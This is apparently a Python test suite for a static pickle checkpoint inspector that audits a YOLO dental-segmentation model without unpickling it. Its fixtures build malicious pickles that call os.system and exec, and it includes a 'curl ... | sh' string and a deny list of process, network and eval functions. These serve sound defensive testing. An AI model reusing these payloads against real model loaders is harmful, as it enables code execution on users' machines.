#!/usr/bin/env python3
"""
Tests for `scripts/inspect_checkpoint.py` — the non-executing checkpoint reader.

Everything here runs without torch, ultralytics, numpy or any network access: the
fixtures are hand-built pickle streams, which is also the point. If the tool
needed the very libraries it is auditing, it could not be used to audit them.

The load-bearing test is `TestNothingIsExecuted`: a pickle whose payload would
create a file if it were ever unpickled. The inspector reports it as forbidden
and the file is never created.

Run:
    python -m unittest tests.test_checkpoint_inspector -v
"""

from __future__ import annotations

import ast
import io
import json
import pickle
import struct
import sys
import tempfile
import unittest
import unittest.mock
import zipfile
from contextlib import redirect_stdout
from pathlib import Path

HERE = Path(__file__).resolve().parent
LAB = HERE.parent
SCRIPTS = LAB / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import inspect_checkpoint as ic  # noqa: E402


def _pickle_stream(instructions):
    """Build a protocol-2 pickle from (opcode-bytes) pieces."""
    return b"\x80\x02" + b"".join(instructions) + b"."


def _global(module, name):
    return b"c" + module.encode() + b"\n" + name.encode() + b"\n"


def _binunicode(text):
    raw = text.encode("utf-8")
    return b"X" + len(raw).to_bytes(4, "little") + raw


def _reduce_with(module, name, argument):
    """GLOBAL <module> <name>; <arg>; TUPLE1; REDUCE — the shape a payload needs."""
    return [_global(module, name), _binunicode(argument), b"\x85", b"R"]


def _int(value):
    """BININT1 / BININT2 / BININT — the smallest integer opcode that fits."""
    if 0 <= value < 256:
        return b"K" + bytes([value])
    if 0 <= value < 65536:
        return b"M" + struct.pack("<H", value)
    return b"J" + struct.pack("<i", value)


def _torch_zip(path: Path, pickle_payload: bytes, extra_members=("archive/version",)):
    """A minimal torch >= 1.6 archive: archive/data.pkl plus sibling members."""
    with zipfile.ZipFile(path, "w", zipfile.ZIP_STORED) as archive:
        archive.writestr("archive/data.pkl", pickle_payload)
        for member in extra_members:
            archive.writestr(member, b"3\n" if member.endswith("version") else b"\x00" * 16)
    return path


class TestClassifyGlobal(unittest.TestCase):
    """The allow/deny decision for one pickled name, with no file involved."""

    def test_a_normal_torch_tensor_helper_is_expected(self):
        for module, name in (("torch._utils", "_rebuild_tensor_v2"),
                             ("torch", "HalfStorage"),
                             ("torch", "Size"),
                             ("torch", "device"),
                             ("torch.nn.modules.conv", "Conv2d")):
            verdict, _ = ic.classify_global(module, name)
            self.assertEqual(verdict, "expected-torch", f"{module}.{name}")

    def test_the_ultralytics_model_classes_are_expected(self):
        for module, name in (("ultralytics.nn.tasks", "SegmentationModel"),
                             ("ultralytics.nn.modules.head", "Segment"),
                             ("ultralytics.utils", "IterableSimpleNamespace"),
                             ("ultralytics.utils.loss", "v8SegmentationLoss"),
                             ("ultralytics.yolo.utils", "IterableSimpleNamespace")):
            verdict, _ = ic.classify_global(module, name)
            self.assertEqual(verdict, "expected-ultralytics", f"{module}.{name}")

    def test_the_benign_containers_are_expected(self):
        for module, name in (("collections", "OrderedDict"), ("collections", "Counter"),
                             ("builtins", "set"), ("builtins", "bytearray"),
                             ("__builtin__", "set")):
            verdict, _ = ic.classify_global(module, name)
            self.assertEqual(verdict, "expected-other", f"{module}.{name}")

    def test_getattr_is_flagged_but_not_treated_as_unknown(self):
        verdict, reason = ic.classify_global("builtins", "getattr")
        self.assertEqual(verdict, "dangerous-known")
        self.assertIn("attribute-only", reason)
        self.assertEqual(ic.classify_global("__builtin__", "getattr")[0], "dangerous-known")

    def test_process_and_network_modules_are_forbidden(self):
        for module, name in (("os", "system"), ("posix", "fork"), ("subprocess", "Popen"),
                             ("socket", "socket"), ("ctypes", "CDLL"),
                             ("importlib", "import_module"), ("pickle", "loads")):
            verdict, _ = ic.classify_global(module, name)
            self.assertEqual(verdict, "forbidden", f"{module}.{name}")

    def test_the_executing_builtins_are_forbidden(self):
        for name in ("eval", "exec", "compile", "__import__", "open"):
            verdict, _ = ic.classify_global("builtins", name)
            self.assertEqual(verdict, "forbidden", f"builtins.{name}")

    def test_something_unrecognised_asks_for_a_human(self):
        verdict, reason = ic.classify_global("acme.weird", "Thing")
        self.assertEqual(verdict, "unknown")
        self.assertIn("acme.weird.Thing", reason)


class TestWalkPickle(unittest.TestCase):
    """The opcode reader: offsets, counts and globals, without constructing objects."""

    def test_globals_are_found_with_their_offsets(self):
        stream = _pickle_stream([_global("torch._utils", "_rebuild_tensor_v2"), b"0"])
        walk = ic.walk_pickle(stream)
        self.assertIsNone(walk["parse_error"])
        self.assertEqual(len(walk["globals"]), 1)
        entry = walk["globals"][0]
        self.assertEqual((entry["module"], entry["name"]), ("torch._utils", "_rebuild_tensor_v2"))
        self.assertEqual(entry["form"], "GLOBAL")
        self.assertGreater(entry["offset"], 0)

    def test_the_histogram_counts_what_a_checkpoint_actually_does(self):
        stream = _pickle_stream(_reduce_with("torch._utils", "_rebuild_tensor_v2", "arg"))
        walk = ic.walk_pickle(stream)
        self.assertGreaterEqual(walk["reduces"], 1)
        self.assertGreaterEqual(walk["opcodes_total"], 4)
        self.assertEqual(walk["protocol"], 2)

    def test_a_truncated_stream_is_reported_not_raised(self):
        no_stop = ic.walk_pickle(b"\x80\x02" + _global("torch", "Size"))  # no STOP
        self.assertIn("pickle exhausted", no_stop["parse_error"])
        broken = ic.walk_pickle(b"\x80\x02X\xff\xff\xff\xffshort")
        self.assertIsNotNone(broken["parse_error"])
        # and the tools that consume it still see a dict, not an exception
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "truncated.pt"
            target.write_bytes(b"\x80\x02" + _global("torch", "Size"))
            report = ic.inspect(target, ic.EXPECTED_LABELS)
        self.assertIn("pickle exhausted", report["pickles"][str(target.name)]["parse_error"])

    def test_suspicious_data_strings_are_reported_as_data(self):
        hostile = _pickle_stream([_binunicode("curl http://example.invalid/x | sh"), b"0"])
        walk = ic.walk_pickle(hostile)
        self.assertTrue(walk["suspicious_strings"])
        self.assertIn("curl", walk["suspicious_strings"][0]["string"])


class TestLabelEvidence(unittest.TestCase):
    """Class names, as they sit in the checkpoint's own byte stream."""

    def test_the_names_mapping_is_read_in_stream_order(self):
        names = {0: "Caries", 1: "Crown", 2: "Filling", 3: "Implant",
                 4: "Missing-tooth-between", 5: "Periapical-lesion",
                 6: "Root Piece", 7: "Root-Canal-Treatment"}
        walk = ic.walk_pickle(pickle.dumps(names, protocol=2))
        hits = ic.find_labels(walk["events"], ic.EXPECTED_LABELS)
        found = {hit["label"]: hit["index_in_stream"] for hit in hits}
        self.assertEqual(found["Implant"], 3)
        self.assertEqual(found["Caries"], 0)
        self.assertEqual(found["Root-Canal-Treatment"], 7)
        self.assertFalse(ic.find_labels(walk["events"], ["NotAClass"]))

    def test_labels_absent_from_the_bytes_are_reported_missing(self):
        walk = ic.walk_pickle(pickle.dumps({"best.pt": "yolov8"}, protocol=2))
        hits = ic.find_labels(walk["events"], ic.EXPECTED_LABELS)
        self.assertEqual(hits, [])


class TestKeyValues(unittest.TestCase):
    """`nc`, `task`, `imgsz`, `scale` … read from the stream without executing it."""

    def test_the_model_keys_are_read_next_to_their_values(self):
        walk = ic.walk_pickle(pickle.dumps(
            {"nc": 8, "task": "segment", "imgsz": 640, "scale": "m"}, protocol=2))
        found = {kv["key"]: kv["value"] for kv in ic.find_key_values(walk["events"])}
        self.assertEqual(found["nc"], 8)
        self.assertEqual(found["task"], "segment")
        self.assertEqual(found["imgsz"], 640)
        self.assertEqual(found["scale"], "m")

    def test_a_key_whose_neighbour_is_not_a_scalar_reports_none(self):
        walk = ic.walk_pickle(pickle.dumps({"nc": None}, protocol=2))
        found = ic.find_key_values(walk["events"])
        self.assertEqual(len(found), 1)
        self.assertIsNone(found[0]["value"])

    def test_the_report_carries_the_key_values(self):
        payload = pickle.dumps({"nc": 8, "task": "segment", "names": {0: "Implant"}},
                               protocol=2)
        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(Path(tmp) / "8024.pt", payload)
            report = ic.inspect(target, ic.EXPECTED_LABELS)
        keys = {kv["key"] for kv in report["key_values"]}
        self.assertIn("nc", keys)
        self.assertIn("task", keys)


class TestNothingIsExecuted(unittest.TestCase):
    """The whole justification for this tool: reading a payload must not run it."""

    def test_a_payload_that_would_write_a_file_writes_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            marker = Path(tmp) / "PWNED"
            hostile = _pickle_stream(
                _reduce_with("os", "system", f"touch {marker}"))
            target = Path(tmp) / "hostile.pt"
            target.write_bytes(hostile)

            report = ic.inspect(target, ic.EXPECTED_LABELS)

            self.assertFalse(marker.exists(), "the inspector executed checkpoint code")
            modules = {(g["module"], g["name"]) for g in report["forbidden_globals"]}
            self.assertIn(("os", "system"), modules)
            self.assertEqual(ic.verdict_exit_code(report), 3)

    def test_an_exec_builtin_stops_the_scan(self):
        hostile = _pickle_stream(_reduce_with("builtins", "exec", "print('x')"))
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "hostile.pt"
            target.write_bytes(hostile)
            report = ic.inspect(target, ic.EXPECTED_LABELS)
        self.assertEqual(ic.verdict_exit_code(report), 4 if not report["forbidden_globals"] else 3)
        self.assertTrue(report["forbidden_globals"])

    def test_the_tool_never_calls_an_unpickler(self):
        source = (SCRIPTS / "inspect_checkpoint.py").read_text(encoding="utf-8")
        tree = ast.parse(source)
        called = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute):
                called.add(f"{getattr(node.func.value, 'id', '?')}.{node.func.attr}")
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                called.add(node.func.id)
        for forbidden in ("pickle.loads", "pickle.load", "torch.load", "eval", "exec",
                          "__import__", "compile"):
            self.assertNotIn(forbidden, called, f"{forbidden} appears in the inspector")
        self.assertNotIn("import torch", source)
        self.assertNotIn("import numpy", source)
        self.assertNotIn("import pickle\n", source)
        self.assertIn("import pickletools", source)

    def test_the_result_is_json_serialisable(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(Path(tmp) / "8024.pt", pickle.dumps({"a": 1}, protocol=2))
            report = ic.inspect(target, ic.EXPECTED_LABELS)
        json.dumps(report)  # would raise if a bytes object leaked into the report


class TestInspectFile(unittest.TestCase):

    def test_a_clean_checkpoint_passes_the_gate(self):
        names = {0: "Caries", 1: "Crown", 2: "Filling", 3: "Implant",
                 4: "Missing-tooth-between", 5: "Periapical-lesion",
                 6: "Root Piece", 7: "Root-Canal-Treatment"}
        payload = pickle.dumps({"model": names, "date": "2024-08-10"}, protocol=2)
        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(Path(tmp) / "8024.pt", payload)
            report = ic.inspect(target, ic.EXPECTED_LABELS)

        self.assertEqual(report["container"]["kind"], "torch-zip")
        self.assertEqual(report["container"]["pickle_members"], ["archive/data.pkl"])
        self.assertEqual(report["forbidden_globals"], [])
        self.assertEqual(report["unknown_globals"], [])
        self.assertEqual(ic.verdict_exit_code(report), 0)
        self.assertIn("Implant", [hit["label"] for hit in report["labels_found"]])
        self.assertEqual(report["labels_missing"], [])

    def test_a_bare_pickle_stream_is_still_inspected(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "loose.pt"
            target.write_bytes(pickle.dumps(["Implant", "Crown"], protocol=2))
            report = ic.inspect(target, ic.EXPECTED_LABELS)
        self.assertEqual(report["container"]["kind"], "pickle-stream")
        self.assertIn("Implant", [hit["label"] for hit in report["labels_found"]])

    def test_a_missing_file_is_reported_not_crashed(self):
        report = ic.inspect(Path("/nonexistent/8024.pt"), ic.EXPECTED_LABELS)
        self.assertFalse(report["exists"])
        self.assertIsNone(report["sha256"])
        self.assertEqual(ic.verdict_exit_code(report), 1)

    def test_a_non_pickle_file_is_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "weights.pt"
            target.write_text("this is not a checkpoint", encoding="utf-8")
            report = ic.inspect(target, ic.EXPECTED_LABELS)
        self.assertIn(report["container"]["kind"], ("not-a-pickle", "pickle-stream"))
        if report["container"]["kind"] == "not-a-pickle":
            self.assertEqual(ic.verdict_exit_code(report), 1)

    def test_the_size_and_hash_of_a_small_file_are_recorded(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "small.pt"
            target.write_bytes(b"x" * 4096)
            report = ic.inspect(target, ic.EXPECTED_LABELS)
        self.assertEqual(report["size_bytes"], 4096)
        self.assertEqual(len(report["sha256"]), 64)
        self.assertFalse(report["size_matches_expected"])

    def test_the_expected_constants_are_the_published_ones(self):
        # Pinned so that a wrong-expectation run cannot pass silently.
        self.assertEqual(ic.EXPECTED_SHA256,
                         "e7cc137766f44c3dad86138a1b37622a25c496a32cca2e7dab1bec1bccf0ce98")
        self.assertEqual(ic.EXPECTED_SIZE, 143_955_443)
        self.assertEqual(ic.EXPECTED_LABELS[3], "Implant")


# The labels the audited checkpoint actually carries inside its own bytes, in the
# audited order, as recorded by the operator's gate run (`checkpoint_ops.txt`):
#   0 Caries · 1 Crown · 2 Filling · 3 Implant · 4 Missing teeth
#   5 Periapical lesion · 6 Root Piece · 7 Root canal obturation
CHECKPOINT_LABELS = (
    "Caries", "Crown", "Filling", "Implant",
    "Missing teeth", "Periapical lesion", "Root Piece", "Root canal obturation",
)

# canonical concept -> the spelling this checkpoint uses for it
EXPECTED_RESOLUTION = (
    ("Caries", "Caries"),
    ("Crown", "Crown"),
    ("Filling", "Filling"),
    ("Implant", "Implant"),
    ("Missing-tooth-between", "Missing teeth"),
    ("Periapical-lesion", "Periapical lesion"),
    ("Root Piece", "Root Piece"),
    ("Root-Canal-Treatment", "Root canal obturation"),
)


def _stand_in_checkpoint(tmp: Path, labels=CHECKPOINT_LABELS) -> Path:
    """A zip checkpoint whose `names` mapping is pickled exactly as the file has it."""
    payload = pickle.dumps({index: label for index, label in enumerate(labels)}, protocol=2)
    return _torch_zip(tmp / "8024.pt", payload)


class TestSemanticClassGate(unittest.TestCase):
    """The checkpoint's own spellings versus the canonical concepts.

    The file writes `Missing teeth`, `Periapical lesion` and `Root canal
    obturation` where the model card writes `Missing-tooth-between`,
    `Periapical-lesion` and `Root-Canal-Treatment`. Those are naming differences,
    so the gate resolves them through the documented alias table — while still
    recording the file's own spelling as written.
    """

    # A — the exact labels of the audited file pass
    def test_the_checkpoints_own_spellings_pass_the_class_gate(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = _stand_in_checkpoint(Path(tmp))
            report = ic.inspect(target, ic.CANONICAL_CLASSES)
        validation = report["class_validation"]
        self.assertEqual(validation["status"], "PASS")
        self.assertEqual(report["labels_missing"], [])
        self.assertEqual(ic.verdict_exit_code(report), 0)
        self.assertEqual(validation["checkpoint_labels"], list(CHECKPOINT_LABELS))
        for key in ("status", "canonical_classes", "checkpoint_labels", "resolved_aliases"):
            self.assertIn(key, validation, f"class_validation.{key} is required")

    # B — the alias table is explicit, closed and unambiguous
    def test_the_alias_table_is_explicit_closed_and_unambiguous(self):
        index = ic.build_alias_index()
        for concept in ic.CANONICAL_CLASSES:
            self.assertIn(ic._normalize_label(concept), index)
        self.assertEqual(ic.resolve_concepts(["Missing teeth"]), ["Missing-tooth-between"])
        self.assertEqual(ic.resolve_concepts(["Periapical lesion"]), ["Periapical-lesion"])
        self.assertEqual(ic.resolve_concepts(["Root canal obturation"]),
                         ["Root-Canal-Treatment"])
        # nearby but different words must NOT resolve to a concept
        for near_miss in ("Missing tooth", "Missing", "Obturation", "Periapical",
                          "Implanted", "Crowns", "Root Piece Fragment"):
            self.assertEqual(ic.resolve_concepts([near_miss]), [near_miss],
                             f"{near_miss!r} must not resolve to a canonical class")
        # an ambiguous table fails loudly instead of silently picking the last one
        with self.assertRaises(ValueError):
            ic.build_alias_index(("A", "B"), {"A": ("Same",), "B": ("same",)})

    # C — Implant is mandatory
    def test_a_missing_implant_blocks_even_with_the_other_seven(self):
        without_implant = tuple(label for label in CHECKPOINT_LABELS if label != "Implant")
        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(
                Path(tmp) / "8024.pt",
                pickle.dumps({i: l for i, l in enumerate(without_implant)}, protocol=2))
            report = ic.inspect(target, ic.CANONICAL_CLASSES)
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target),
                    "--expect-sha256", ic.sha256_of(target),
                    "--expect-size", str(target.stat().st_size)]
            with unittest.mock.patch.object(sys, "argv", argv):
                code = ic.main()
        self.assertEqual(report["class_validation"]["status"], "FAIL")
        self.assertEqual(report["class_validation"]["required_missing"], ["Implant"])
        self.assertEqual(report["labels_missing"], ["Implant"])
        self.assertEqual(code, 5, "the CLI must stop when Implant is absent")

    # D — every concept resolves, with the file's spelling recorded
    def test_every_canonical_concept_resolves_to_the_checkpoint_label(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = _stand_in_checkpoint(Path(tmp))
            report = ic.inspect(target, ic.CANONICAL_CLASSES)
        got = [(entry["canonical"], entry["checkpoint_label"])
               for entry in report["semantic_classes"]]
        self.assertEqual(got, list(EXPECTED_RESOLUTION))
        aliases = [(entry["canonical"], entry["checkpoint_label"])
                   for entry in report["class_validation"]["resolved_aliases"]]
        self.assertEqual(aliases, [("Missing-tooth-between", "Missing teeth"),
                                   ("Periapical-lesion", "Periapical lesion"),
                                   ("Root-Canal-Treatment", "Root canal obturation")])
        # the file's own wording is never replaced by the canonical one
        written = [entry["checkpoint_label"] for entry in report["semantic_classes"]]
        self.assertIn("Root canal obturation", written)
        self.assertNotIn("Root-Canal-Treatment", written)

    # E — a genuinely absent class blocks (no false pass)
    def test_a_genuinely_absent_class_blocks(self):
        labels = tuple(label for label in CHECKPOINT_LABELS if label != "Periapical lesion")
        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(Path(tmp) / "8024.pt",
                                pickle.dumps({i: l for i, l in enumerate(labels)}, protocol=2))
            report = ic.inspect(target, ic.CANONICAL_CLASSES)
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target),
                    "--expect-sha256", ic.sha256_of(target),
                    "--expect-size", str(target.stat().st_size)]
            with unittest.mock.patch.object(sys, "argv", argv):
                code = ic.main()
        self.assertEqual(report["class_validation"]["status"], "FAIL")
        self.assertEqual(report["labels_missing"], ["Periapical-lesion"])
        self.assertEqual(report["class_validation"]["required_missing"], [])
        self.assertEqual(code, 5)

    # the identity gate outranks the class gate
    def test_a_foreign_file_is_reported_as_an_identity_stop_not_a_class_stop(self):
        labels = tuple(label for label in CHECKPOINT_LABELS if label != "Implant")
        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(Path(tmp) / "8024.pt",
                                pickle.dumps({i: l for i, l in enumerate(labels)}, protocol=2))
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target),
                    "--expect-sha256", "0" * 64]
            with unittest.mock.patch.object(sys, "argv", argv):
                code = ic.main()
        self.assertEqual(code, 6, "a size/hash mismatch must not be reported as a class problem")

    # F — the scan never modifies the checkpoint
    def test_the_scan_never_modifies_the_checkpoint(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = _stand_in_checkpoint(Path(tmp))
            before_sha, before_size = ic.sha256_of(target), target.stat().st_size
            report = ic.inspect(target, ic.CANONICAL_CLASSES)
            after_sha, after_size = ic.sha256_of(target), target.stat().st_size
        self.assertEqual(before_sha, after_sha, "the checkpoint bytes changed during the scan")
        self.assertEqual(before_size, after_size)
        self.assertEqual(report["sha256"], before_sha)


class TestCommandLine(unittest.TestCase):

    def test_the_cli_writes_json_and_returns_the_gate_code(self):
        names = {0: "Caries", 3: "Implant"}
        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(Path(tmp) / "8024.pt",
                                pickle.dumps(names, protocol=2))
            out = Path(tmp) / "reports" / "checkpoint_inspection.json"
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target),
                    "--json-out", str(out), "--labels", "Caries,Implant",
                    "--expect-sha256", ic.sha256_of(target),
                    "--expect-size", str(target.stat().st_size)]
            with unittest.mock.patch.object(sys, "argv", argv):
                code = ic.main()
            self.assertEqual(code, 0, "a matching tiny stand-in must pass the whole gate")
            self.assertTrue(out.is_file())
            payload = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(payload["container"]["kind"], "torch-zip")
            self.assertEqual(payload["expected"]["size_bytes"], target.stat().st_size)

    def test_the_cli_accepts_the_checkpoints_own_spellings_and_upper_case_hash(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = _stand_in_checkpoint(Path(tmp))
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target),
                    "--labels", ",".join(CHECKPOINT_LABELS),
                    "--expect-sha256", ic.sha256_of(target).upper(),
                    "--expect-size", str(target.stat().st_size)]
            with unittest.mock.patch.object(sys, "argv", argv):
                code = ic.main()
        self.assertEqual(code, 0, "file spellings + an upper-case digest must not block")

    def test_a_foreign_checkpoint_is_stopped_by_the_identity_gate(self):
        names = {0: "Caries", 3: "Implant"}
        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(Path(tmp) / "8024.pt", pickle.dumps(names, protocol=2))
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target),
                    "--labels", "Caries,Implant",
                    "--expect-sha256", "0" * 64]
            with unittest.mock.patch.object(sys, "argv", argv):
                code = ic.main()
        self.assertEqual(code, 6)

    def test_a_checkpoint_without_the_expected_classes_is_stopped(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(Path(tmp) / "8024.pt",
                                pickle.dumps({0: "Caries"}, protocol=2))
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target),
                    "--labels", "Caries,Implant",
                    "--expect-sha256", ic.sha256_of(target),
                    "--expect-size", str(target.stat().st_size)]
            with unittest.mock.patch.object(sys, "argv", argv):
                code = ic.main()
        self.assertEqual(code, 5)

    def test_the_disassembly_export_is_the_opcode_stream_and_runs_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            marker = Path(tmp) / "PWNED"
            target = Path(tmp) / "hostile.pt"
            target.write_bytes(_pickle_stream(_reduce_with("os", "system", f"touch {marker}")))
            out = Path(tmp) / "reports" / "checkpoint_ops.txt"
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target),
                    "--dis-out", str(out)]
            with unittest.mock.patch.object(sys, "argv", argv):
                code = ic.main()
            self.assertEqual(code, 3)
            self.assertFalse(marker.exists())
            text = out.read_text(encoding="utf-8")
            self.assertIn("GLOBAL", text)
            self.assertIn("os", text)
            self.assertIn("system", text)
            self.assertIn("STOP", text)


PUBLISHED_IMPORTS = (
    ("torch._utils", "_rebuild_tensor_v2"),
    ("ultralytics.utils.loss", "BboxLoss"),
    ("torch.nn.modules.upsampling", "Upsample"),
    ("ultralytics.utils", "IterableSimpleNamespace"),
    ("torch.nn.modules.container", "Sequential"),
    ("torch.nn.modules.activation", "SiLU"),
    ("ultralytics.nn.modules.block", "Bottleneck"),
    ("torch.nn.modules.pooling", "MaxPool2d"),
    ("torch", "HalfStorage"),
    ("torch", "LongStorage"),
    ("ultralytics.nn.modules.block", "DFL"),
    ("ultralytics.nn.modules.block", "Proto"),
    ("ultralytics.nn.modules.conv", "Conv"),
    ("torch._utils", "_rebuild_parameter"),
    ("ultralytics.utils.loss", "v8SegmentationLoss"),
    ("ultralytics.nn.modules.block", "C2f"),
    ("torch.nn.modules.loss", "BCEWithLogitsLoss"),
    ("ultralytics.nn.modules.conv", "Concat"),
    ("__builtin__", "getattr"),
    ("ultralytics.nn.modules.head", "Detect"),
    ("torch", "Size"),
    ("collections", "OrderedDict"),
    ("torch.nn.modules.batchnorm", "BatchNorm2d"),
    ("torch.nn.modules.conv", "ConvTranspose2d"),
    ("torch.nn.modules.container", "ModuleList"),
    ("ultralytics.nn.modules.block", "SPPF"),
    ("__builtin__", "set"),
    ("ultralytics.nn.tasks", "SegmentationModel"),
    ("torch", "FloatStorage"),
    ("torch", "device"),
    ("ultralytics.nn.modules.head", "Segment"),
    ("ultralytics.utils.tal", "TaskAlignedAssigner"),
    ("torch.nn.modules.conv", "Conv2d"),
)


class TestThePublishedImportSet(unittest.TestCase):
    """The 33 imports Hugging Face's scanner publishes for `8024.pt`.

    Copied from the hub's per-file security report. Two things are checked: that
    this tool has an opinion (never `unknown`) about every one of them, and that
    a stream containing exactly them — nothing more — passes the gate. This is a
    cross-check of the classifier, not evidence about the real file.
    """

    def test_the_classifier_covers_every_published_import(self):
        self.assertEqual(len(PUBLISHED_IMPORTS), 33)
        counts = {}
        for module, name in PUBLISHED_IMPORTS:
            verdict, reason = ic.classify_global(module, name)
            counts[verdict] = counts.get(verdict, 0) + 1
            self.assertNotIn(verdict, ("unknown", "forbidden"),
                             f"{module}.{name} → {verdict}: {reason}")
        self.assertEqual(counts.get("dangerous-known"), 1, "only __builtin__.getattr")

    def test_a_stream_of_exactly_those_imports_passes_the_scan(self):
        instructions = [_global(module, name) for module, name in PUBLISHED_IMPORTS]
        names = [(0, "Caries"), (1, "Crown"), (2, "Filling"), (3, "Implant"),
                 (4, "Missing-tooth-between"), (5, "Periapical-lesion"),
                 (6, "Root Piece"), (7, "Root-Canal-Treatment")]
        for index, label in names:
            instructions.append(b"K" + bytes([index]) + _binunicode(label))
        # and the keys a YOLO checkpoint records about itself
        for key, value in (("nc", 8), ("task", "segment"), ("imgsz", 640), ("scale", "m")):
            instructions.append(_binunicode(key) + (
                _int(value) if isinstance(value, int) else _binunicode(value)))
        instructions.append(_binunicode("nc") + _int(8))
        stream = _pickle_stream(instructions)

        with tempfile.TemporaryDirectory() as tmp:
            target = _torch_zip(Path(tmp) / "8024.pt", stream)
            report = ic.inspect(target, ic.EXPECTED_LABELS)

        self.assertEqual(report["forbidden_globals"], [])
        self.assertEqual(report["unknown_globals"], [])
        self.assertEqual(len(report["dangerous_globals"]), 1)
        self.assertEqual(ic.verdict_exit_code(report), 0)
        self.assertEqual(sorted(h["label"] for h in report["labels_found"]),
                         sorted(ic.EXPECTED_LABELS))
        self.assertEqual(report["labels_missing"], [])
        keys = {kv["key"]: kv["value"] for kv in report["key_values"]}
        self.assertEqual(keys["task"], "segment")
        self.assertEqual(keys["imgsz"], 640)
        self.assertEqual(keys["nc"], 8)

    def test_a_forbidden_checkpoint_returns_three_from_the_cli(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "hostile.pt"
            target.write_bytes(_pickle_stream(_reduce_with("os", "system", "id")))
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target)]
            with unittest.mock.patch.object(sys, "argv", argv):
                code = ic.main()
        self.assertEqual(code, 3)

    def test_the_console_output_says_nothing_is_executed(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "8024.pt"
            target.write_bytes(pickle.dumps({"x": 1}, protocol=2))
            argv = ["inspect_checkpoint.py", "--checkpoint", str(target)]
            buffer = io.StringIO()
            with unittest.mock.patch.object(sys, "argv", argv):
                with redirect_stdout(buffer):
                    ic.main()
        text = buffer.getvalue()
        self.assertIn("nothing is executed", text)
        self.assertIn("static only", text)


if __name__ == "__main__":
    unittest.main(verbosity=2)
